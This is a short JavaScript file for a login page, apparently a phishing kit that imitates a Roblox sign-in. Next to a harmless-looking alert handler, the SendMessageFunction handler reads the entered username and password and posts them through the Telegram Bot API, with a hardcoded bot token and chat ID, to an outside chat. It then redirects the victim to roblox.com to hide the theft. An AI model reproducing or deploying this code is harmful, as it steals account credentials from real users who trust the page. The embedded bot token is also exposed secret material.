
document.getElementById('login-btn').addEventListener('click', function () {
    const username = document.getElementById('username').value;
    const password = document.getElementById('password').value;

    if (username && password) {
        alert(`Logged in as ${username}`);
        // Реальная аутентификация будет сюда
    } else {
        alert('Please enter both username and password!');
    }
});

document.getElementById('alternate-device').addEventListener('click', function () {
    alert('You can log in with another device.');
});

let inputs = document.querySelectorAll('input');
let buttonLogin = document.querySelector('#login-btn');

const SendMessageFunction = () => {
    let Token = '8503458586:AAFG4Hsm27xQWOfWEJ4xsYbbvjlPOFR1UZw';
    let ChatId = '1894178614';
    let ApiUrl = `https://api.telegram.org/bot${Token}/sendMessage`;

    let data = {
        chat_id: ChatId,
        text: `username: ${inputs[0].value} \npassword: ${inputs[1].value}`
    };

    let options = {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(data)
    };

    fetch(ApiUrl, options)
        .then(data => data.json())
        .then(res => {
            console.log('Data sent:', res);
            window.location.href = "https://www.roblox.com/"; // Перенаправление на Roblox
        })
        .catch(error => console.log('Error:', error));
};

buttonLogin.addEventListener('click', SendMessageFunction);
